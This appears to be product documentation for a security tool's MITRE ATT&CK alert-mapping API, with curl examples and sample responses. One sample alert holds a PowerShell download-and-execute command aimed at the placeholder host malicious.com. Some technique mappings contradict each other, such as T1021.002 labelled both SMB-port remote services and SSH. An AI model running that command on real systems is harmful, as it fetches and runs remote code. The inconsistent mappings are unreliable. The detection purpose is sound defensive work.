# MITRE ATT&CK Mapping Guide

## Overview

Fortress XDR AI automatically maps detected security events to the MITRE ATT&CK framework, providing:

- **Tactic Identification**: Which attack phase is occurring
- **Technique Mapping**: Specific attack methods being used
- **Subtechnique Details**: Variants and specific implementations
- **Attack Chain Visualization**: Sequential attack flow

## How It Works

### Alert Analysis Pipeline

```
Raw Alert
    ↓
Process Name Matching → powershell.exe → T1059.001 (PowerShell)
    ↓
Command Line Analysis → DownloadString + IEX → T1027 (Obfuscation)
    ↓
Event Type Analysis → Event ID 4625 → T1110 (Brute Force)
    ↓
Network Pattern → Port 445 + Process → T1021.002 (Remote Services)
    ↓
Mapped Techniques & Tactics
```

## Supported Techniques

### Execution (T1059, T1086, T1204)
- PowerShell Execution (T1059.001)
- Command Shell Execution (T1059.003)
- User Execution (T1204)

### Credential Access (T1110, T1187, T1056)
- Brute Force Attacks (T1110)
- Password Spraying (T1110.002)
- Keylogging (T1056.001)

### Lateral Movement (T1021, T1570)
- Remote Services (T1021.006 - WinRM)
- SSH (T1021.003)
- Lateral Tool Transfer (T1570)

### Defense Evasion (T1197, T1036, T1027, T1140)
- BITS Jobs (T1197)
- Masquerading (T1036)
- Obfuscation (T1027)

### Persistence (T1547, T1543)
- Registry Run Keys (T1547.001)
- Windows Service Creation (T1543.003)

### Command & Control (T1071, T1572)
- Web Protocols (T1071.001)
- DNS Protocol (T1071.004)
- Protocol Tunneling (T1572)

### Exfiltration (T1020, T1048, T1041)
- Automated Exfiltration (T1020)
- Data Transfer (T1048)

### Privilege Escalation (T1134, T1547)
- Token Manipulation (T1134.003)
- Exploitation (T1547)

## API Examples

### Map Alert to MITRE Techniques

```bash
curl -X POST http://localhost:8000/api/v1/mitre/map-alert \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "process_name": "powershell.exe",
    "command_line": "powershell -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com')",
    "event_type": "process_creation"
  }'
```

Response:
```json
{
  "alert": {
    "process_name": "powershell.exe",
    "command_line": "powershell -Command IEX...",
    "event_type": "process_creation"
  },
  "mapped_techniques": [
    {
      "id": "T1059.001",
      "name": "Command and Scripting Interpreter: PowerShell",
      "tactic": "execution",
      "severity": "critical"
    },
    {
      "id": "T1027",
      "name": "Obfuscated Files or Information",
      "tactic": "defense-evasion",
      "severity": "high"
    },
    {
      "id": "T1105",
      "name": "Ingress Tool Transfer",
      "tactic": "command-and-control",
      "severity": "high"
    }
  ],
  "count": 3
}
```

### Get Attack Chain

```bash
curl -X POST http://localhost:8000/api/v1/mitre/attack-chain \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"techniques": ["T1110", "T1078", "T1021.006", "T1048"]}'  
```

Response:
```json
{
  "input_techniques": ["T1110", "T1078", "T1021.006", "T1048"],
  "attack_chain": [
    {
      "tactic": "credential-access",
      "techniques": ["T1110", "T1078"]
    },
    {
      "tactic": "lateral-movement",
      "techniques": ["T1021.006"]
    },
    {
      "tactic": "exfiltration",
      "techniques": ["T1048"]
    }
  ],
  "tactics_involved": ["credential-access", "lateral-movement", "exfiltration"]
}
```

## MITRE Dashboard

Access the MITRE coverage dashboard:

```bash
curl http://localhost:8000/api/v1/mitre/dashboard \
  -H "Authorization: Bearer YOUR_JWT_TOKEN"
```

Returns:
- Tactics covered in your detections
- Top techniques detected
- Coverage percentage
- Total techniques in database

## Severity Mapping

**Critical Severity Techniques:**
- T1110 (Brute Force)
- T1059.001 (PowerShell)
- T1134.003 (Token Impersonation)
- T1021.002 (SSH)

**High Severity Techniques:**
- T1071.001 (Web Protocols C2)
- T1048.001 (Exfiltration)
- T1547.001 (Registry Run Keys)

## Integration with Investigation

When investigating an incident:

1. **Identify Mapped Techniques** → Understand attack methods
2. **Follow Attack Chain** → See sequential progression
3. **Review Subtechniques** → Get specific variant details
4. **Cross-Reference Tactics** → Understand attack objectives
5. **Generate Report** → Document MITRE mappings

## Use Cases

### Incident Analysis
```
Alert: Multiple failed logins + PowerShell execution + outbound connection
↓
Mapped Techniques: T1110 (Brute Force) + T1059.001 (PowerShell) + T1071.001 (C2)
↓
Attack Chain: Credential Access → Execution → Command & Control
↓
Impact: Likely compromised credentials with C2 communication
```

### Threat Hunting
```
Goal: Find all T1048 (Exfiltration) events
↓
Query: GET /api/v1/mitre/techniques/T1048
↓
Results: Network transfer patterns, data volume thresholds, suspicious IPs
↓
Action: Hunt for similar patterns in your environment
```

### Compliance Reporting
```
Requirement: PCI DSS requires detection of credential stuffing (T1110.003)
↓
Query: Map all failed login attempts to T1110
↓
Report: Generate compliance-mapped incident reports
```
